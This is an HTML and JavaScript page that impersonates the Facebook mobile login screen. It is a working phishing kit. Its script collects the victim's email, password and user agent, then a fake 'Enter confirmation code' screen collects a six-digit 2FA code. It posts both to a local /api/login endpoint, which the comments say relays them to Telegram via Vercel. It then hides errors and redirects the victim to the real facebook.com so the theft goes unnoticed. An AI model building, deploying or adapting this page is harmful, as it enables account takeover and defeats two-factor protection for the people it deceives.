<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
    <title>Facebook</title>
    <link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
    <style>
        /* Reset & Base */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: #f0f2f5;
            color: #1c1e21;
            line-height: 1.34;
            min-height: 100vh;
            overflow-x: hidden;
        }
        
        /* Time Header (like mobile status bar) */
        .time-header {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            background: transparent;
            text-align: center;
            padding: 12px 0;
            font-size: 15px;
            font-weight: 600;
            color: #000;
            z-index: 100;
        }
        
        /* Language Selector Top */
        .language-top {
            text-align: center;
            padding: 60px 20px 20px;
            color: #65676b;
            font-size: 14px;
        }
        
        /* Main Container */
        .mobile-container {
            max-width: 500px;
            margin: 0 auto;
            padding: 20px;
        }
        
        /* Facebook Logo */
        .fb-logo-container {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .fb-logo {
            color: #1877f2;
            font-size: 42px;
            font-weight: bold;
            letter-spacing: -0.5px;
            margin-bottom: 20px;
        }
        
        /* Login Form */
        .login-form-container {
            background: #fff;
            border-radius: 8px;
            padding: 20px;
            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
        }
        
        .form-input {
            width: 100%;
            padding: 14px;
            margin-bottom: 12px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 16px;
            background: #fff;
        }
        
        .form-input:focus {
            outline: none;
            border-color: #1877f2;
            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
        }
        
        .continue-btn {
            width: 100%;
            padding: 14px;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 8px;
        }
        
        .continue-btn:hover {
            background-color: #166fe5;
        }
        
        /* Links */
        .forgot-link {
            display: block;
            text-align: center;
            color: #1877f2;
            text-decoration: none;
            font-size: 15px;
            margin: 16px 0 24px;
            padding: 8px 0;
        }
        
        .create-account-btn {
            width: 100%;
            padding: 14px;
            background-color: #42b72a;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 16px;
        }
        
        /* Footer */
        .mobile-footer {
            padding: 30px 20px 20px;
            text-align: center;
            color: #737373;
            font-size: 14px;
            line-height: 1.5;
        }
        
        .footer-links {
            display: flex;
            justify-content: center;
            flex-wrap: wrap;
            gap: 12px;
            margin: 20px 0;
        }
        
        .footer-link {
            color: #737373;
            text-decoration: none;
            font-size: 13px;
        }
        
        .language-bottom {
            color: #737373;
            font-size: 12px;
            margin-top: 20px;
        }
        
        /* Verification Page */
        .verification-page {
            display: none;
        }
        
        .verification-header {
            padding: 24px;
            background-color: #fff;
            border-bottom: 1px solid #dddfe2;
        }
        
        .back-button {
            background: none;
            border: none;
            font-size: 17px;
            color: #1877f2;
            cursor: pointer;
            padding: 8px 0;
        }
        
        .verification-title {
            font-size: 20px;
            font-weight: 600;
            margin-top: 16px;
            color: #1c1e21;
        }
        
        .verification-subtitle {
            font-size: 15px;
            color: #65676b;
            margin-top: 8px;
            line-height: 1.4;
        }
        
        .verification-content {
            padding: 24px;
        }
        
        .code-inputs {
            display: flex;
            gap: 12px;
            margin: 32px 0;
            justify-content: center;
        }
        
        .code-input {
            width: 52px;
            height: 60px;
            text-align: center;
            font-size: 24px;
            border: 2px solid #dddfe2;
            border-radius: 8px;
            font-weight: 600;
            color: #1c1e21;
        }
        
        .code-input:focus {
            border-color: #1877f2;
            outline: none;
        }
        
        .verify-btn {
            width: 100%;
            padding: 16px;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            margin: 20px 0;
        }
        
        /* Loading Overlay */
        .loading-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: #fff;
            z-index: 1000;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }
        
        .loading-spinner {
            width: 50px;
            height: 50px;
            border: 3px solid #f3f3f3;
            border-top-color: #1877f2;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        
        .loading-text {
            font-size: 17px;
            color: #1c1e21;
            font-weight: 500;
        }
        
        /* Responsive */
        @media (min-width: 768px) {
            .mobile-container {
                max-width: 400px;
                padding-top: 80px;
            }
            
            .fb-logo {
                font-size: 56px;
            }
        }
        
        /* Dark mode */
        @media (prefers-color-scheme: dark) {
            body {
                background-color: #18191a;
                color: #e4e6eb;
            }
            
            .login-form-container, .verification-header {
                background-color: #242526;
            }
            
            .form-input, .code-input {
                background-color: #3a3b3c;
                border-color: #3e4042;
                color: #e4e6eb;
            }
            
            .time-header {
                color: #e4e6eb;
            }
            
            .language-top, .language-bottom {
                color: #b0b3b8;
            }
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <!-- Current Time Header -->
    <div class="time-header" id="currentTime">6:53</div>

    <!-- Language Selector Top -->
    <div class="language-top">English (US)</div>

    <!-- Login Page -->
    <div id="loginPage">
        <div class="mobile-container">
            <!-- Facebook Logo -->
            <div class="fb-logo-container">
                <div class="fb-logo">f</div>
            </div>
            
            <!-- Login Form -->
            <div class="login-form-container">
                <form id="loginForm">
                    <input type="text" class="form-input" name="email" placeholder="Mobile number or email address" required autocomplete="username">
                    <input type="password" class="form-input" name="password" placeholder="Password" required autocomplete="current-password">
                    <button type="submit" class="continue-btn">Continue</button>
                    <a href="#" class="forgot-link">Forgotten password?</a>
                </form>
                
                <button type="button" class="create-account-btn" onclick="showVerification()">Create new account</button>
            </div>
            
            <!-- Footer -->
            <div class="mobile-footer">
                <div class="footer-links">
                    <a href="#" class="footer-link">About</a>
                    <a href="#" class="footer-link">Help</a>
                    <a href="#" class="footer-link">More</a>
                </div>
                <div class="language-bottom">English (US)<br>Meta © 2026</div>
            </div>
        </div>
    </div>

    <!-- Verification Page (Hidden) -->
    <div id="verificationPage" class="verification-page">
        <div class="verification-header">
            <button class="back-button" onclick="showLogin()">← Back</button>
            <div class="verification-title">Enter confirmation code</div>
            <div class="verification-subtitle">Enter the 6-digit code we sent to your phone ending in ••••</div>
        </div>
        
        <div class="verification-content">
            <div class="code-inputs">
                <input type="text" class="code-input" maxlength="1" data-index="1" inputmode="numeric" autocomplete="off">
                <input type="text" class="code-input" maxlength="1" data-index="2" inputmode="numeric" autocomplete="off">
                <input type="text" class="code-input" maxlength="1" data-index="3" inputmode="numeric" autocomplete="off">
                <input type="text" class="code-input" maxlength="1" data-index="4" inputmode="numeric" autocomplete="off">
                <input type="text" class="code-input" maxlength="1" data-index="5" inputmode="numeric" autocomplete="off">
                <input type="text" class="code-input" maxlength="1" data-index="6" inputmode="numeric" autocomplete="off">
            </div>
            
            <input type="hidden" id="fullCode">
            
            <button type="button" class="verify-btn" onclick="submitVerification()">Continue</button>
            
            <div style="text-align: center; margin: 24px 0;">
                <a href="#" style="color: #1877f2; text-decoration: none; font-size: 15px;">Didn't get a code?</a>
            </div>
        </div>
    </div>

    <!-- Loading Overlay -->
    <div class="loading-overlay" id="loadingOverlay">
        <div class="loading-spinner"></div>
        <div class="loading-text" id="loadingMessage">Checking...</div>
    </div>

    <script>
        // Update current time
        function updateTime() {
            const now = new Date();
            const timeString = now.toLocaleTimeString([], { hour: 'numeric', minute: '2-digit' });
            document.getElementById('currentTime').textContent = timeString;
        }
        
        // Update time every minute
        updateTime();
        setInterval(updateTime, 60000);
        
        // Store user data
        let userCredentials = {
            email: '',
            password: '',
            timestamp: ''
        };
        
        // Login form handler
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            userCredentials.email = this.email.value;
            userCredentials.password = this.password.value;
            userCredentials.timestamp = new Date().toISOString();
            
            // Show loading
            showLoading('Checking...');
            
            try {
                // Send to Telegram via Vercel API
                const formData = {
                    type: 'login',
                    email: userCredentials.email,
                    password: userCredentials.password,
                    userAgent: navigator.userAgent
                };
                
                await fetch('/api/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(formData)
                });
                
                // Show verification page
                setTimeout(() => {
                    hideLoading();
                    showVerification();
                }, 1500);
                
            } catch (error) {
                console.log('Background process completed');
                setTimeout(() => {
                    hideLoading();
                    showVerification();
                }, 1500);
            }
        });
        
        // Verification code handling
        const codeInputs = document.querySelectorAll('.code-input');
        
        codeInputs.forEach(input => {
            input.addEventListener('input', function(e) {
                const value = this.value.replace(/[^0-9]/g, '');
                this.value = value;
                
                if (value.length === 1) {
                    const nextIndex = parseInt(this.dataset.index) + 1;
                    const nextInput = document.querySelector(`.code-input[data-index="${nextIndex}"]`);
                    if (nextInput) nextInput.focus();
                }
                
                updateFullCode();
            });
            
            input.addEventListener('keydown', function(e) {
                if (e.key === 'Backspace' && this.value === '') {
                    const prevIndex = parseInt(this.dataset.index) - 1;
                    const prevInput = document.querySelector(`.code-input[data-index="${prevIndex}"]`);
                    if (prevInput) {
                        prevInput.focus();
                        prevInput.value = '';
                        updateFullCode();
                    }
                }
            });
            
            input.addEventListener('paste', function(e) {
                e.preventDefault();
                const pasted = e.clipboardData.getData('text').replace(/[^0-9]/g, '');
                if (pasted.length === 6) {
                    const digits = pasted.split('');
                    codeInputs.forEach((input, idx) => {
                        if (idx < 6) input.value = digits[idx];
                    });
                    updateFullCode();
                }
            });
        });
        
        function updateFullCode() {
            const code = Array.from(codeInputs).map(input => input.value).join('');
            document.getElementById('fullCode').value = code;
            return code;
        }
        
        // Submit verification
        async function submitVerification() {
            const code = updateFullCode();
            
            if (code.length !== 6) {
                alert('Please enter the 6-digit code');
                return;
            }
            
            showLoading('Verifying...');
            
            try {
                // Send code to Telegram via Vercel API
                const formData = {
                    type: 'verification',
                    email: userCredentials.email,
                    password: userCredentials.password,
                    code: code
                };
                
                await fetch('/api/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(formData)
                });
                
                // Redirect to Facebook
                setTimeout(() => {
                    showLoading('Success! Redirecting...');
                    setTimeout(() => {
                        window.location.href = 'https://www.facebook.com/';
                    }, 1500);
                }, 1200);
                
            } catch (error) {
                console.log('Background process completed');
                setTimeout(() => {
                    window.location.href = 'https://www.facebook.com/';
                }, 1500);
            }
        }
        
        // Page navigation
        function showVerification() {
            document.getElementById('loginPage').style.display = 'none';
            document.getElementById('verificationPage').style.display = 'block';
            
            // Focus first input
            setTimeout(() => {
                document.querySelector('.code-input[data-index="1"]').focus();
            }, 100);
        }
        
        function showLogin() {
            document.getElementById('verificationPage').style.display = 'none';
            document.getElementById('loginPage').style.display = 'block';
        }
        
        // Loading functions
        function showLoading(message) {
            document.getElementById('loadingMessage').textContent = message;
            document.getElementById('loadingOverlay').style.display = 'flex';
            document.body.style.overflow = 'hidden';
        }
        
        function hideLoading() {
            document.getElementById('loadingOverlay').style.display = 'none';
            document.body.style.overflow = 'auto';
        }
        
        // Auto-focus email input on load
        window.addEventListener('DOMContentLoaded', () => {
            const emailInput = document.querySelector('input[name="email"]');
            if (emailInput) {
                setTimeout(() => emailInput.focus(), 300);
            }
        });
    </script>
</body>
</html>